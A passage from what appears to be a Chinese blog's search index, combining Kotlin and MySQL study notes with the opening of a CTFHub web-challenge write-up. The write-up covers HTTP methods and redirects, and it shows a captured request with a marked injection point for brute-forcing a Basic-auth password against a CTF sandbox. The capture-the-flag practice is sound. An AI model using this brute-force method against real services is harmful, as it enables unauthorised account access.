&#125;&#125;\n\n也就是说，无论是属性还是方法都是在类中不允许被覆盖的\n必须显式的声明这些可以被覆盖，子类中也必须说明我们覆盖了这些\n属性属性的声明\nKotlin类的属性可以用关键字var声明可变，也可以用关键字val声明为可读的\nGetters与Setters\n声明一个属性的完整语法是\nvar &lt;propertyName&gt;[: &lt;PropertyType&gt;] [= &lt;property_initializer&gt;] \t[&lt;getter&gt;] \t[&lt;setter&gt;]\n\n其中初始器，getter，setter都是可选的。\n如果属性类型可以从初始器（或者getter）中推断出来，可以省略属性类型\n// 继承class Dog(age: Int) : Animal(age) &#123;    var simple: Int?        get() &#123;            println(&quot;get&quot;)            return 1        &#125;        set(value) &#123;&#125;    //覆盖属性    override val foot = 4    // 覆盖方法    override fun eat() &#123;        println(&quot;simple：$&#123;simple&#125;&quot;)    &#125;&#125;//运行fun main() &#123;    var dog = Dog(2)    dog.eat()    println(&quot;==============&quot;)    var simple = dog.simple&#125;//----------运行结果------------/*    2    get    simple：1    ==============    get*/\n\n我们需要知道getter和setter的特点\n\n定义了getter，每次访问属性的时候都会调用它\n定义了setter，每次赋值都会调用它\n\n延迟初始化属性\n通常属性声明为非空类型必须在构造方法中初始化。\n然后这不利于依赖注入来初始化或者单元测试的setup方法初始化\n为了处理这种情况，可以使用lateinit来延迟初始化\ndata class Shop(val name: String, val location: String)class Test &#123;    lateinit var shop: Shop    fun setup() &#123;        shop = Shop(&quot;杂货铺&quot;, &quot;深圳&quot;)    &#125;    fun eat() &#123;        if(::shop.isInitialized) &#123;            println(shop.location)        &#125;    &#125;&#125;\n\n在这种延迟初始化方式中，我们在未初始化的情况下去访问属性的时候会抛出异常\n我们可以通过属性的if(::shop.isInitialized)来检测\n抽象类与接口抽象类\nabstract class Printer &#123;    abstract fun print()&#125;class FilePrinter : Printer() &#123;    override fun print() &#123;        TODO(&quot;Not yet implemented&quot;)    &#125;&#125;\n\n接口\nKotlin中的接口即可包含抽象方法的声明，也可包含实现。\n与抽象类不同的是，接口无法保存状态，它可以由属性，但是必须把声明为抽象或提供访问器实现\ninterface Study &#123;    var time :Int    fun address()    fun earningCourses() &#123;        println(&quot;架构师&quot;)    &#125;&#125;class StudyAs(override var time: Int) : Study&#123;        override fun address() &#123;        TODO(&quot;Not yet implemented&quot;)    &#125;&#125;\n\n\n\n数据类数据类指的是我们只保存数据的一些类\ndata class Address(val name: String, val number: Int) &#123;     var city: String = &quot;&quot;     fun print() &#123;         println(city)     &#125; &#125;\n\n数据类的要求：\n主构造方法需要至少一个参数\n主构造方法都需要标记为val var\n对象表达式与对象声明在Kotlin提供对象表达式来方面我们需要对一个类轻微改动并创建它的对象，而不是为之显式声明新的子类。\n对象表达式\n要创建一个继承自某个类型的匿名类的对象，我们会这么写：\nopen class Address2(name: String) &#123;    open fun print() &#123;    &#125;&#125;class Shop2 &#123;    var address: Address2? = null    fun addAddress(address: Address2) &#123;        this.address = address    &#125;&#125;fun test3() &#123;    Shop2().addAddress(object :Address2(&quot;Android&quot;)&#123;        override fun print() &#123;            super.print()        &#125;    &#125;)&#125;\n\n匿名对象可以用作只在本地和私有作用域中声明的类型\n对象声明是指我们把class变为object，变成了对象声明\nobject DataUtil &#123;     fun isEmpty(list: ArrayList?): Boolean &#123;         return list?.isEmpty() ?: false     &#125; &#125; fun testDataUtil() &#123;     val list = arrayListOf(&quot;1&quot;) \t\t\t\t\tprintln(DataUtil.isEmpty(list)) &#125;\n\n注意看，这里是我们使用object来使得这个变为静态的\n我们调用方法不用实例化\n"},{"title":"性能调优-Mysql","url":"/2021/03/29/2021/%E6%80%A7%E8%83%BD%E8%B0%83%E4%BC%98-Mysql/","content":"\n\n索引\nMysql索引数据结构索引结构一般的索引结构开始被认为是\n\n二叉树\n红黑树\nHash表\nB-Tree\n\n二叉树二叉树一般用平衡二叉树作为索引结点，但是可能出现这样的情况\n\n这样磁盘IO的次数在大量数据的情况下会很多。显而易见不是很好\n红黑树红黑树会自旋，不会出现二叉树这样在一条路上走到黑的情况。那么红黑树有什么缺点呢？\n可以看到在大容量的数据下，磁盘IO的次数是树的高度。而二叉树每个节点只有一个数据。\n可以试想千万级的数据下，二叉树的高度为log2(千万)，大概二十次左右，也就是需要进行二十次的磁盘IO。\n【我觉得这个量级还行，但是工程上肯定是还有更好的\nHashHash表指的对索引按照哈希算法得到对应的空间\n显然使用Hash索引可以很快的得到对应的文件，这是它最大的优点。\n但是为什么不使用Hash表索引呢？\n无法范围查找 \nB-TreeB树的优点在于每一个节点有多个数据，而不是想上面的一样，一个节点只有一个数据。\n总的来说B-Tree就是帮助节点横向延申了，但还是可以继续优化的【前辈们真是厉害啊 \n这时候就出现了B+ 树。为了更加的大\n\n【那个红色字体没写完–\n总的来说 一个节点可以存放 16KB&#x2F;14B &#x3D; 1170个小整体\n那么按图上说的 最后有多少个节点？ 1170*1170 个大节点\n而大节点中存放的数据有多少个？ 假设一份数据大小为1kb，则大节点中有16个数据。\n对应的 上图可以有1170 x 1170  x 16 &#x3D;2.1千万。\n这样来看，千万级数据，高度为三就可以，也就是说，只需要进行三次磁盘IO就可以查到元素。\n【谨记 磁盘IO的速度绝对比内存的运算慢\n B+Tree 底部指针\nB+Tree 在常规数据结构的时候，是单向指针，但是在Mysql中对底层做了优化，变成了双向指针\n存储引擎常见的MyISAM  innoDB\n小常识 \n存储引擎是对表而言  也就是说 库里面不同表可以用不同的存储引擎\n表和索引文件存储在C:\\Program Files\\MYSQL\\mysql-8.0.17-winx64\\data\\下\nMyISAM表的结构 .frm | 表中存储的数据行 .MYD | 索引字段 .MYI\n\n索引和数据分开，称之为非聚集索引\ninnoDB表结构 .frm  数据+索引 .ibd\ninnoDB是聚集索引，它的索引和数据是在一个文件里面的\ninnoDB设计的就是需要一个B+Tree来组织好文件，毕竟.ibd是把索引和数据和在一起了\n表数据文件本身就是按B+Tree组织的一个索引结构文件\n聚集索引-叶节点包含了完整的数据记录\n\n为什么InnoDB表必须有主键，并且推荐使用整型的自增主键？\n\n这是个好问题\n首先 innoDB的设计就是需要有索引-数据配合在一个文件里面的，这样才能构成B+树\n那么 如果你没有手动设置主键，Mysql可能在innoDB中找了一列作为唯一索引\n如果没有一列可以被认为是唯一索引，那么会在末尾建立一列 Rowid，以这列作为索引\n当然这个是不会显示出来的\n此外用整形是为了占用内存少，比较速度快\n而自增是因为 如果不自增的话，你插入到中间，可能会触发B+树的分裂和自增\n\n为什么非主键索引结构叶子节点存储的是主键值？(一致性和节省存储空间)\n\n\n如果各自索引文件存数据，可能出现事务问题，即索引一数据没改动  索引二数据改动了 【注意 索引树都在ibd文件中\n所以维护一致性原则，可以把数据统一放在主键索引处。\n这也就是为什么非主键索引叶子节点存储的是主键值。\n当然这也可以节省空间，但是我觉得更加重要的是一致性问题\n\n联合索引\n\n联合索引当然要看到其底层结构（id,name,data）\n\n联合索引还是有本质特点，排好序的。\n可以看到下面这个排序是使用索引最左前缀原理的方式\nMysql执行计划与索引详解注意：一个表定然会有主键索引，但是除了主键索引之外，可以有其他的索引，只是其他索引的叶子节点的值是主键\nExplain工具介绍使用EXPLAIN关键字可以模拟优化器执行SQL语句，分析你的查询语句或是结构的性能瓶颈 在 select 语句之前增加 explain 关键字，MySQL 会在查询上设置一个标记，执行查询会返 回执行计划的信息，而不是执行这条SQL 注意：如果 from 中包含子查询，仍会执行该子查询，将结果放入临时表中。\nEXPLAIN SELECT * FROM m_user WHERE ID = 1 \n\n可以看到：\n可以看到对应的一些列\n下面分析一下对应的列的信息表示什么？\nexplain中的列1. id列 \nid列的编号是 select 的序列号，有几个 select 就有几个id，并且id的顺序是按select 出现的顺序增长的。 \nid列越大执行优先级越高，id相同则从上往下执行，id为NULL最后执行。 \n这里显示了ID的作用 越大优先级越高 同等大小 则从上往下执行\n2. select_type列 \nselect_type 表示对应行是简单还是复杂的查询\n1）simple：简单查询。查询不包含子查询和union \n2）primary：复杂查询中最外层的 select\n3）subquery：包含在 select 中的子查询（不在 from 子句中） \n4）derived：包含在 from 子句中的子查询。MySQL会将结果存放在一个临时表中，也称为派生表（derived的英文含义） \n3. table列 \n这一列表示 explain 的一行正在访问哪个表。 \n当 from 子句中有子查询时，table列是&lt;derivenN&gt;格式，表示当前查询依赖 id&#x3D;N 的查 询，于是先执行 id&#x3D;N 的查询。 \n当有 union 时，UNION RESULT 的 table 列的值为&lt;union1,2&gt;，1和2表示参与 union 的 select 行id。\n4. type列 \n这一列表示关联类型或访问类型，即MySQL决定如何查找表中的行，查找数据行记录的大概范围。 \n依次从最优到最差分别为：system &gt; const &gt; eq_ref &gt; ref &gt; range &gt; index &gt; ALL \n一般来说，得保证查询达到range级别，最好达到ref \nNULL：mysql能够在优化阶段分解查询语句，在执行阶段用不着再访问表或索引。例如：在索引列中选取最小值，可以单独查找索引来完成，不需要在执行时访问表 \nmysql&gt; explain select min(id) from film;\nconst, system：mysql能对查询的某部分进行优化并将其转化成一个常量（可以看show warnings 的结果）。用于 primary key 或 unique key 的所有列与常数比较时，所以表最多有一个匹配行，读取1次，速度比较快。system是const的特例，表里只有一条元组匹配时为system \neq_ref：primary key 或 unique key 索引的所有部分被连接使用 ，最多只会返回一条符合条件的记录。这可能是在 const 之外最好的联接类型了，简单的 select 查询不会出现这种type。 \nref：相比 eq_ref，不使用唯一索引，而是使用普通索引或者唯一性索引的部分前缀，索引要和某个值相比较，可能会找到多个符合条件的行。\n\n简单 select 查询，name是普通索引（非唯一索引）\n\nmysql&gt; explain select * from film where name = &#39;film1&#39;; \n​\t2.关联表查询，idx_film_actor_id是film_id和actor_id的联合索引，这里使用到了film_actor 的左边前缀film_id部分。 \nmysql&gt; explain select film_id from film left join film_actor on film.id = film_actor.film_id;  \nrange：范围扫描通常出现在 in(), between ,&gt; ,&lt;, &gt;&#x3D; 等操作中。使用一个索引来检索给定范围的行。 \nindex：扫描全表索引，这通常比ALL快一些。\nALL：即全表扫描，意味着mysql需要从头到尾去查找所需要的行。通常情况下这需要增加索引来进行优化了 \nref列 \n这一列显示了在key列记录的索引中，表查找值所用到的列或常量，常见的有：const（常量），字段名（例：film.id）【表示右边的值\nrows列 \n这一列是mysql估计要读取并检测的行数，注意这个不是结果集里的行数。\n调优关键列-Extra列这一列展示的是额外信息。常见的重要值如下： \n1）Using index：使用覆盖索引 \nmysql&gt; explain select film_id from film_actor where film_id &#x3D; 1; \n\n什么是覆盖索引？\n\nselect file_id from film_actor where film_id = 1\n注意到select的值是什么？这里的值是索引里面的值。所以说如果结果集是索引的值，那么被认为是覆盖索引。\n也就是说select film_id remake from film_actor hwere film_id = 1这是不走覆盖索引的，因为remake不是索引的值\n2）Using where：使用 where 语句来处理结果，查询的列未被索引覆盖 \nmysql&gt; explain select * from actor where name = &#39;a&#39;; \nname没有被索引\n3）Using index condition：查询的列不完全被索引覆盖，where条件中是一个前导列的范围；\nmysql&gt; explain select * from film_actor where film_id &gt; 1;\n4）Using temporary：mysql需要创建一张临时表来处理查询。出现这种情况一般是要进行 \n优化的，首先是想到用索引来优化。 \n\nactor.name没有索引，此时创建了张临时表来distinct\n\nmysql&gt; explain select distinct name from actor; \n\nfilm.name建立了idx_name索引，此时查询时extra是using index,没有用临时表\n\nmysql&gt; explain select distinct name from film; \n去重的话，可以使用加索引\n5）Using filesort：将用外部排序而不是索引排序，数据较小时从内存排序，否则需要在磁盘完成排序。这种情况下一般也是要考虑使用索引来优化的。\n\nactor.name未创建索引，会浏览actor整个表，保存排序关键字name和对应的id，然后排序name并检索行记录\n\nmysql&gt; explain select * from actor order by name; \n\nfilm.name建立了idx_name索引,此时查询时extra是using index\n\nmysql&gt; explain select * from film order by name;\n可以看到排序可以加索引\n6）Select tables optimized away：使用某些聚合函数（比如 max、min）来访问存在索引的某个字段是 \nmysql&gt; explain select min(id) from film; \n例子演示-- sql例子DROP TABLE IF EXISTS `employees`;CREATE TABLE `employees`  (  `id` int(11) NOT NULL AUTO_INCREMENT,  `name` varchar(24) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT &#x27;&#x27; COMMENT &#x27;姓名&#x27;,  `age` int(11) NOT NULL DEFAULT 0 COMMENT &#x27;年龄&#x27;,  `position` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT &#x27;&#x27; COMMENT &#x27;职位&#x27;,  `hire_time` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT &#x27;入职时 间&#x27;,  PRIMARY KEY (`id`) USING BTREE,  INDEX `idx_name_age_position`(`name`, `age`, `position`) USING BTREE) ENGINE = InnoDB AUTO_INCREMENT = 4 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = &#x27;员工记录表&#x27; ROW_FORMAT = Dynamic;INSERT INTO `employees` VALUES (4, &#x27;LiLei&#x27;, 22, &#x27;mana ger&#x27;, &#x27;2021-03-31 16:53:50&#x27;);INSERT INTO `employees` VALUES (5, &#x27;HanMeimei&#x27;, 23, &#x27;dev&#x27;, &#x27;2021-03-31 16:53:50&#x27;);INSERT INTO `employees` VALUES (6, &#x27;Lucy&#x27;, 23, &#x27;dev&#x27;, &#x27;2021-03-31 16:53:50&#x27;);\n\n全值匹配也就是说走索引\n最左前缀法则如果索引了多列，要遵守最左前缀法则。指的是查询从索引的最左前列开始并且不跳过索引中的列。\n不对索引进行修饰不在索引列上做任何操作（计算、函数、（自动or手动）类型转换），会导致索引失效而转向全表扫描\n存储引擎不能使用索引中范围条件右边的列EXPLAIN SELECT * FROM employees WHERE name= &#39;LiLei&#39; AND age = 22 AND position =&#39;manager&#39;; \nEXPLAIN SELECT * FROM employees WHERE name= &#39;LiLei&#39; AND age &gt; 22 AND position =&#39;manager&#39;; \n少用select *尽量使用覆盖索引（只访问索引的查询（索引列包含查询列）），减少select *语句\n不等于不走索引mysql在使用不等于（！&#x3D;或者&lt;&gt;）的时候无法使用索引会导致全表扫描 \nis null,is not null 也无法使用索引\n通配符小心like以通配符开头（’$abc…’）mysql索引失效会变成全表扫描操作\n数据类型转换字符串不加单引号索引失效 ，MYSQL底层会对字符串类型进行转变，这就违反了对索引不可进行修饰的原则。\n少用or或in 少用or或in，用它查询时，mysql不一定使用索引，mysql内部优化器会根据检索比例、表大小等多个因素整体评估是否使用索引，详见范围查询优化 \n范围查询优化给年龄添加单值索引 \nADD INDEX `idx_age` (`age`) USING BTREE ; explain select * from employees where age &gt;=1 and age &lt;=2000; \n\n没走索引原因：mysql内部优化器会根据检索比例、表大小等多个因素整体评估是否使用索引。比如这个例子，可能是由于单次数据量查询过大导致优化器最终选择不走索引 \n优化方法：可以讲大的范围拆分成多个小范围 \n也就是说 大范围的改成小范围的可以走索引路径\n索引使用总结\n索引优化-order、group索引优化的话 还是从数据结构上来检查和审阅\n但是，我们也可以使用trace工具来查看mysql到底是怎么执行的？\n总的来说 sql走不走索引？ 执行计划真正是怎么样的？\n如果order by 排序底层是怎么排的？走index 还是 filesort\nfilesort有哪两种？分别解决什么问题 有什么帮助？\n常见sql深入优化Order by与Group by优化 \n一般都是最左前缀准则来看，同时看是否经过了索引字段\n或者覆盖索引\n优化总结：1、MySQL支持两种方式的排序filesort和index，Using index是指MySQL扫描索引本身完成排序。index 效率高，filesort效率低。 \n2、order by满足两种情况会使用Using index。 \n\norder by语句使用索引最左前列。 \n\n使用where子句与order by子句条件列组合满足索引最左前列。\n\n\n3、尽量在索引列上完成排序，遵循索引建立（索引创建的顺序）时的最左前缀法则。 \n4、如果order by的条件不在索引列上，就会产生Using filesort。 \n5、能用覆盖索引尽量用覆盖索引 \n6、group by与order by很类似，其实质是先排序后分组，遵照索引创建顺序的最左前缀法则。对于group by的优化如果不需要排序的可以加上order by null禁止排序。注意，where高于having，能写在where中的限定条件就不要去having限定了。\n\nTIP\n总的来说，它的order by是依靠着走索引的方式来帮助的\ngroup by则是先排序 后优化 也和order by的处理方式一致\n\n\nUsing filesort文件排序原理详解filesort文件排序方式单路排序：是一次性取出满足条件行的所有字段，然后在sort buffer中进行排序；用trace工具可以看到sort_mode信息里显示&lt; sort_key, additional_fields &gt;或者&lt; sort_key, packed_additional_fields &gt;\n双路排序（又叫回表排序模式）：是首先根据相应的条件取出相应的排序字段和可以直接定位行数据的行 ID，然后在 sort buffer 中进行排序，排序完后需要再次取回其它需要的字段；用trace工具 可以看到sort_mode信息里显示&lt; sort_key, rowid &gt; \nMySQL 通过比较系统变量 max_length_for_sort_data(默认1024字节) 的大小和需要查询的字段总大小来 \n判断使用哪种排序模式。 \n如果 max_length_for_sort_data 比查询字段的总长度大，那么使用 单路排序模式； \n如果 max_length_for_sort_data 比查询字段的总长度小，那么使用 双路排序模式。\n\n我们先看单路排序的详细过程： \n\n从索引name找到第一个满足 name &#x3D; ‘zhuge’ 条件的主键 id \n\n根据主键 id 取出整行，取出所有字段的值，存入 sort_buffer 中 \n\n从索引name找到下一个满足 name &#x3D; ‘zhuge’ 条件的主键 id \n\n重复步骤 2、3 直到不满足 name &#x3D; ‘zhuge’ \n\n对 sort_buffer 中的数据按照字段 position 进行排序 \n\n返回结果给客户端\n\n\n我们再看下双路排序的详细过程： \n\n从索引 name 找到第一个满足 name &#x3D; ‘zhuge’ 的主键id \n\n根据主键 id 取出整行，把排序字段 position 和主键 id 这两个字段放到 sort buffer 中 \n\n从索引 name 取下一个满足 name &#x3D; ‘zhuge’ 记录的主键 id \n\n重复 3、4 直到不满足 name &#x3D; ‘zhuge’5. 对 sort_buffer 中的字段 position 和主键 id 按照字段 position 进行排序 \n\n遍历排序好的 id 和字段 pos ition，按照 id 的值回到原表中取出 所有字段的值返回给客户端\n\n\n其实对比两个排序模式，单路排序会把所有需要查询的字段都放到 sort buffer 中，而双路排序只会把主键和需要排序的字段放到 sort buffer 中进行排序，然后再通过主键回到原表查询需要的字段。 \n如果 MySQL 排序内存配置的比较小并且没有条件继续增加了，可以适当把 max_length_for_sort_data 配置小点，让优化器选择使用双路排序算法，可以在sort_buffer 中一次排序更多的行，只是需要再根据主键回到原表取数据。 \n如果 MySQL 排序内存有条件可以配置比较大，可以适当增大 max_length_for_sort_data 的值，让优化器优先选择全字段排序(单路排序)，把需要的字段放到 sort_buffer 中，这样排序后就会直接从内存里返回查询结果了。 \n所以，MySQL通过 max_length_for_sort_data 这个参数来控制排序，在不同场景使用不同的排序模式，从而提升排序效率。 \n注意，如果全部使用sort_buffer内存排序一般情况下效率会高于磁盘文件排序，但不能因为这个就随便增大sort_buffer(默认1M)，mysql很多参数设置都是做过优化的，不要轻易调整。\n常见sql深入优化2理解分页很多时候我们业务系统实现分页功能可能会用如下sql实现 \nmysql&gt; select * from employees limit 10000,10;\n表示从表 employees 中取出从 10001 行开始的 10 行记录。看似只查询了 10 条记录，实际这条 SQL 是先读取 10010条记录，然后抛弃前 10000 条记录，然后读到后面 10 条想要的数据。因此要查询一张大表比较靠后的数据，执行效率是非常低的。\n其中可使用的我知道的两种优化：\n根据自增且连续的主键排序的分页查询select * from employees limit 90000,5; \n这样的语句不会走索引，原因是走索引之后：扫描整个索引并查找到没索引的行(可能要遍历多个索引树)的成本比扫描全表的成本更高，所以优化器放弃使用索引。\n所以有优化可以是\nselect * from employees where id &gt; 90000 limit 5;\n这样通过id来帮助走索引是可以有所优化的\n根据非主键字段排序的分页查询select * from employees ORDER BY name limit 90000,5;\n这条语句理论上走到name索引，但是实际上没有走索引\n理由同上↑\n可以改成这样的形式select * from employees e inner join (select id from employees order by name limit 90000,5) ed on e.id = ed.id;\n后面的select是走的name索引，注意到了id覆盖索引。\n所有优化效果好\n\n综上 关于limit的优化其实很有限，如果是主键自增分页，不太好优化，有很大限制\n而非主键字段排序可以试试加索引，然后通过覆盖索引的形式来优化效果\nJoin关联查询优化表关联的两种方式：\nNested-Loop Join 算法 \nBlock Nested-Loop Join 算法 \n嵌套循环连接Nested-Loop Join(NLJ) 算法什么意思呢？举例说明：\n一次一行循环地从第一张表（称为驱动表）中读取行，在这行数据中取到关联字段，根据关联字段在另一张表（被驱动表）里取出满足条件的行，然后取出两张表的结果合集。 \nmysql&gt; EXPLAIN select*from t1 inner join t2 on t1.a&#x3D; t2.a; \n驱动表是 t2，被驱动表是 t1。\n因为小表驱动大表\n先执行的就是驱动表(执行计划结果的id如果一样则按从上到下顺序执行sql)；优化器一般会优先选择小表做驱动表。所以使用 inner join 时，排在前面的表并不一定就是驱动表。 \n一般 join 语句中，如果执行计划 Extra 中未出现 Using join buffer 则表示使用的 join 算法是 NLJ。 \n上面sql的大致流程如下： \n\n从表 t2 中读取一行数据； \n\n从第 1 步的数据中，取出关联字段 a，到表 t1 中查找； \n\n取出表 t1 中满足条件的行，跟 t2 中获取到的结果合并，作为结果返回给客户端； \n\n重复上面 3 步。\n\n\n整个过程会读取 t2 表的所有数据(扫描100行)，然后遍历这每行数据中字段 a 的值，根据 t2 表中 a 的值索引扫描 t1 表中的对应行(扫描100次 t1 表的索引，1次扫描可以认为最终只扫描 t1 表一行完整数据，也就是总共 t1 表也扫描了100行)。因此整个过程扫描了 200 行。 \n如果被驱动表的关联字段没索引，**使用NLJ算法性能会比较低(下面有详细解释)**，mysql会选择Block Nested-Loop Join算法。 \n\n注意到，他其实是先取驱动表中一条，去被驱动表找值。\n基于块的嵌套循环连接 Block Nested-Loop Join(BNL)算法这种算法是使用到了join_buffer这个缓存。在缓存中进行查找明显是比磁盘快的\nmysql&gt;EXPLAIN select*from t1 inner join t2 on t1.b= t2.b;\n说下流程：先是驱动表读入到join_buffer中，然后从被驱动表中抽取一条，和join_buffer进行匹配\n大致流程如下：\n\n把 t2 的所有数据放入到 join_buffer 中 \n\n把表 t1 中每一行取出来，跟 join_buffer 中的数据做对比 \n\n返回满足 join 条件的数据\n\n\n整个过程对表 t1 和 t2 都做了一次全表扫描，因此扫描的总行数为10000(表 t1 的数据总量) + 100(表 t2 的数据总量) &#x3D; 10100。并且 join_buffer 里的数据是无序的，因此对表 t1 中的每一行，都要做 100 次判断，所以内存中的判断次数是100 * 10000&#x3D; 100 万次。 \n被驱动表的关联字段没索引为什么要选择使用 BNL 算法而不使用 Nested-Loop Join 呢？ \n如果上面第二条sql使用 Nested-Loop Join，那么扫描行数为 100 * 10000 &#x3D; 100万次，这个是磁盘扫描。很显然，用BNL磁盘扫描次数少很多，相比于磁盘扫描，BNL的内存计算会快得多。 \n因此MySQL对于被驱动表的关联字段没索引的关联查询，一般都会使用 BNL 算法。如果有索引一般选择 NLJ 算法，有索引的情况下 NLJ 算法比 BNL算法性能更高 \n对于关联sql的优化\n关联字段加索引，让mysql做join操作时尽量选择NLJ算法 \n\n小标驱动大表，写多表连接sql时如果明确知道哪张表是小表可以用straight_join写法固定连接驱动方式，省去\n\n\nmysql优化器自己判断的时间 \nstraight_join解释：straight_join功能同join类似，但能让左边的表来驱动右边的表，能改表优化器对于联表查询的执行顺序。 \n比如：select * from t2 straight_join t1 on t2.a = t1.a; 代表制定mysql选着 t2 表作为驱动表。 \nstraight_join只适用于inner join，并不适用于left join，right join。（因为left join，right join已经代表指定了表的执行顺序） \n尽可能让优化器去判断，因为大部分情况下mysql优化器是比人要聪明的。使用straight_join一定要慎重，因为部分情况下人为指定的执行顺序并不一定会比优化引擎要靠谱。\ncount(*)查询优化临时关闭mysql查询缓存，为了查看sql多次执行的真实时间 \nmysql&gt; set global query_cache_size&#x3D;0; \nmysql&gt; set global query_cache_type&#x3D;0; \n常见四种\nmysql&gt; EXPLAIN select count(1) from employees; \nmysql&gt; EXPLAIN select count(id) from employees;\nmysql&gt; EXPLAIN select count(name) from employees; \nmysql&gt; EXPLAIN select count(*) from employees;\n四个sql的执行计划一样，说明这四个sql执行效率应该差不多，区别在于根据某个字段count不会统计字段为null值的数据行\n其实count最好是使用辅助索引，而不是主键索引。实际上mysql内部也是这样优化的。\n为什么mysql最终选择辅助索引而不是主键聚集索引？因为二级索引相对主键索引存储数据更少，检索性能应该更高 \n常见优化方法 \n1、查询mysql自己维护的总行数 \n对于myisam存储引擎的表做不带where条件的count查询性能是很高的，因为myisam存储引擎的表的总行数会被mysql存储在磁盘上，查询不需要计算 \n对于innodb存储引擎的表mysql不会存储表的总记录行数，查询count需要实时计算 \n2、show table status \n如果只需要知道表总行数的估计值可以用如下sql查询，性能很高 \n3、将总数维护到Redis里 \n插入或删除表数据行的时候同时维护redis里的表总行数key的计数值(用incr或decr命令)，但是这种方式可能不准，很难保证表操作和redis操作的事务一致性 \n4、增加计数表 \n插入或删除表数据行的时候同时维护计数表，让他们在同一个事务里操作\n","tags":["2021"]},{"title":"CTFHUB","url":"/2020/03/02/CTFcomig/CTFHUB/","content":"\nCtfHub良心网站 真是没得很！\n\n\n题目类型在CTF中主要包含以下5个大类的题目，有些比赛会根据自己的侧重点单独添加某个分类，例如移动设备(Mobile), 电子取证(Forensics)等，近年来也会出来混合类型的题目，例如在Web中存在一个二进制程序，需要选手先利用Web的漏洞获取到二进制程序，之后通过逆向或是Pwn等方式获得最终flag\n\nWebWeb类题目大部分情况下和网、Web、HTTP等相关技能有关。主要考察选手对于Web攻防的一些知识技巧。诸如SQL注入、XSS、代码执行、代码审计等等都是很常见的考点。一般情况下Web题目只会给出一个能够访问的URL。部分题目会给出附件\nMiscMisc意为杂项，即不包含在以上分类的题目都会放到这个分类。题目会给出一个附件。选手下载该附件进行分析，最终得出flag常见的题型有图片隐写、视频隐写、文档隐写、流量分析、协议分析、游戏、IoT相关等等。五花八门，种类繁多。\nWEB训练场WEB前置技能–http协议请求方式\n我还尝试了八种请求方式\n。。。。\n八种请求方式：\n\nHTTP&#x2F;1.1协议中共定义了八种方法（有时也叫“动作”）来表明Request-URI指定的资源的不同操作方式：\nOPTIONS返回服务器针对特定资源所支持的HTTP请求方法。也可以利用向Web服务器发送’*’的请求来测试服务器的功能性。HEAD向服务器索要与GET请求相一致的响应，只不过响应体将不会被返回。这一方法可以在不必传输整个响应内容的情况下，就可以获取包含在响应消息头中的元信息。GET向特定的资源发出请求。注意：GET方法不应当被用于产生“副作用”的操作中。POST向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的建立和&#x2F;或已有资源的修改。PUT向指定资源位置上传其最新内容。DELETE请求服务器删除Request-URI所标识的资源。TRACE回显服务器收到的请求，主要用于测试或诊断。CONNECTHTTP&#x2F;1.1协议中预留给能够将连接改为管道方式的代理服务器\n\n题解是 把头改成CTFHUB就可以！\n\n302跳转首先，让我们来了解一下，什么是302重定向。\n百度百科定义如下：302重定向又称之为暂时性转移(Temporarily Moved )，英文名称：302 redirect。 也被认为是暂时重定向（temporary redirect），一条对网站浏览器的指令来显示浏览器被要求显示的不同的URL，当一个网页经历过短期的URL的变化时使用。一个暂时重定向是一种服务器端的重定向，能够被搜索引擎蜘蛛正确地处理。\n302跳转的解决方法有两个 \n1、使用curl命令 之间 curl  目标url\n2、抓包审查\n\n基础认证–Basic Authentication这道题目是真的长知识\n\nHTTP 基本认证大体流程就类似于牛翠花和王二狗接头的过程。1、翠花：走到一个人面前说，二狗带我去吃麻辣烫吧。\n2、二狗：请说出你的暗号。\n3、翠花：天王盖地虎。\n4、二狗：张亮麻辣烫走起。。。\n映射到编程领域为：\n***客户端(例如Web浏览器)***：服务器，请把&#x2F;family&#x2F;son.jpg 图片传给我。\nGET /family/son.jpg  HTTP/1.1\n服务器：客户端你好，这个资源在安全区family里，是受限资源，需要基本认证，请带上你的用户名和密码再来\n&gt;HTTP/1.1 401 Authorization Required&gt;www-Authenticate: Basic realm= &quot;family&quot;\n\n\n服务器会返回401，告知客户端这个资源需要使用基本认证的方式访问，我们可以看到在 www-Authenticate这个Header里面 有两个值，Basic：说明需要基本认证，realm：说明客户端需要输入这个安全区的用户名和密码，而不是其他区的。因为服务器可以为不同的安全区设置不同的用户名和密码。如果服务器只有一个安全区，那么所有的基本认证用户名和密码都是一样的。\n客户端： 服务器，我已经按照你的要求，携带了相应的用户名和密码信息了，你看一下\n如果客户端是浏览器，那么此时就会弹出一个弹窗，让用户输入用户名和密码。\n**Basic 内容为： 用户名:密码 后的base64 内容.假设我的用户名为Shusheng007,密码为ss007 那么我的Basic的内容为 Shusheng007：ss007 对应的base64 编码内容U2h1c2hlbmcwMDcldUZGMUFzczAwNw==**，如下所示\n&gt;GET /family/son.jpg  HTTP/1.1&gt;Authorization: Basic U2h1c2hlbmcwMDcldUZGMUFzczAwNw==\n\n\n服务器：客户端你好，我已经校验了你的用户名和密码，是正确的，这是你要的资源。\n&gt;HTTP/1.1 200 OK&gt;Content-type: image/jpg\n\n至此这个HTTP事务就结束了，非常简单的一个认证机制\n\n而这道题目 他给了密码的文件\n很明显是爆破\n爆破点是\nGET /flag.html HTTP/1.1Host: challenge-4fd44b39b91d3871.sandbox.ctfhub.com:10080User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://challenge-4fd44b39b91d3871.sandbox.ctfhub.com:10080/Authorization: Basic YWRtaW46§admin§      §admin§这个就是爆破点Connection: keep-aliveUpgrade-Insecure-Requests: 1\n\n那么就爆破呗\n然而我发现一个问题的存在\nYWRtaW46YWtzZGphc2pka2E%3d经常出现%3d这样的问题\n这个是字符编码的一个问题\n需要你把攻击的payloads下面的那个 URL-encode these characters取消勾选\n之后就得到答案了！ 奥里给。。\n信息泄露备份文件下载web源码泄漏\n0x01信息泄露有的时候运维或者说是部署人员工，当然也有可能是开发人员在打包项目的时候将。git也打包了而引起了，git的信息泄露，关于常用的其他信息泄露，各位看官可自行Google or 